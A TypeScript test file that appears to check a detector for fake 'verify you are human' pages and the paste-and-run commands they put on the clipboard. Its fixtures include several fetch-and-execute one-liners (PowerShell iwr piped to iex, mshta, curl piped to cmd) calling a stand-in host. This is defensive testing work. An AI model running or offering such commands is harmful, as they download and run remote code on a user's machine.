import assert from 'node:assert/strict'
import test from 'node:test'
import { COMMAND_RE, FAKE_CHECK_RE } from '../src/main/fakeCheck.ts'

test('fake "verify you are human" pages that ask for a pasted command are caught', () => {
  for (const text of [
    'Verify you are human. 1. Press Windows Button "⊞" + R  2. Press CTRL + V  3. Press Enter',
    'Verification steps: Press Win + R, then paste the code and press Enter',
    'Open the Run dialog and paste the verification code',
    'Press Windows key + R, then Ctrl+V and hit Enter',
    'Copy this into PowerShell to finish the check',
    'Please paste the command into your terminal to verify'
  ])
    assert.ok(FAKE_CHECK_RE.test(text), text)
})

test('real checks and ordinary manga pages are not taken for fake ones', () => {
  for (const text of [
    'Just a moment... Verify you are human by completing the action below. comix.to needs to review the security of your connection before proceeding.',
    'Performing security verification. This website uses a security service to protect against malicious bots.',
    'Chapter 120 - The Winner Returns. Read Solo Leveling chapter 120 online. Next chapter, previous chapter.',
    'Ranker who lives a second time. Romance, Action. Ongoing. Released 2020. Winter arc.',
    'Copy link to share this chapter'
  ])
    assert.ok(!FAKE_CHECK_RE.test(text), text)
})

test('commands a fake check puts on the clipboard are recognised; ordinary copied text is not', () => {
  for (const clip of [
    'powershell -w hidden -c "iwr http://x.example/a.ps1 | iex"',
    'mshta https://x.example/verify.hta # I am not a robot - Cloudflare ID: 8812',
    'cmd /c curl -s http://x.example/p | cmd',
    'conhost --headless pwsh -nop -c whatever',
    'cmd.exe /k start ms-settings:'
  ])
    assert.ok(COMMAND_RE.test(clip), clip)
  for (const clip of ['https://comix.to/title/solo-leveling', 'Solo Leveling', 'chapter 12 was great', 'C:\\Users\\me\\Pictures'])
    assert.ok(!COMMAND_RE.test(clip), clip)
})
